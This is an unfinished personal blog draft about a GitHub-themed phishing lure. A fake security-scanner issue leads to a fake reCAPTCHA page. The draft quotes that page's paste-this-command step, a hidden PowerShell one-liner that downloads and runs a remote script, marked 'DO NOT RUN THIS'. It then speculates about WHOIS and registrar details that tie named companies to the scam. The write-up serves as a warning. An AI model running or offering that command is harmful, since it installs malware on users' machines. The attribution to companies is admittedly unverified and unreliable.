THIS IS INCOMPLETE AND POSSIBLY INACCURATE. DONT DRAWY ANY CONCLUSIONS FROM THIS. I WILL GET TL THIS LATER.

Todo: ill just add the screenshots for now. i write the article later either on this saturday and sunday or after my exams are over.

<!--truncate-->

Today, i recieved an email that says theres a security vulnerability detected in one of my github repository. Normally, i recieve emails from depandabot every now and then, but it links me back to github for further action.

But this email, asks me to vist github-scanner.com, and is slightly unusual, as its an issue opened in this repository, that says to go to this unkown link to get more information on how to fix this issue.

As expected, github identified it as fradulent / malicious and has deleted that issue from my repository quickly from github.com

![alt text](image-1.png)

But, i still have the content of that malicious issue opened in my emails. So, i clicked on this link.

It asked to me verify if i'm not a robot. you might expect something similar when using VPNs

![alt text](image-2.png)

![alt text](image-3.png)

DO NOT RUN THIS!

```
powershell.exe -w hidden -Command "iex (iwr 'https://github-scanner.com/download.txt').Content" # "âœ… ''I am not a robot - reCAPTCHA Verification ID: 93752"
```

Looks like the registrant is from Malaysia, Singapore, Indonesia, Thailand, Korea, Hong Kong:

and the number is associated with many scams:

NOTE: THEY ARE EITHER A SERVICE PROVIDER BEING ABUSED BY SCAMMERS
OR THEY THEMSELVES ARE THE SCAMMERS

Upon googling, we can sort of confirm the details about him.

"Information in the whois is just the contact information for the company that owns the registrar.
WebNic (The Registrar) seems to be owned by https://www.qinetics.net/. I think this is as far as the story goes, nothing illegitimate with qinetics and no obvious leads forwards."

company info: (possibly sketchy)

![alt text](image-17.png)

this seems to be a company with a similiar name in the same address, possible the same floor, `L4-E-2, HIVE 5`
and it might be mistaken to the original scam

![alt text](image-18.png)

which is at: `L4-E-2, LEVEL 4`

![alt text](image-19.png)

or, it might even be the same company

![alt text](image-20.png)   

Qinetics Solutions Sdn Bhd are hiring:

![alt text](image-21.png)

reg.asia might be a service provider

![alt text](image-23.png)

yeah

what it come down to is customers abusing a company - possibly...
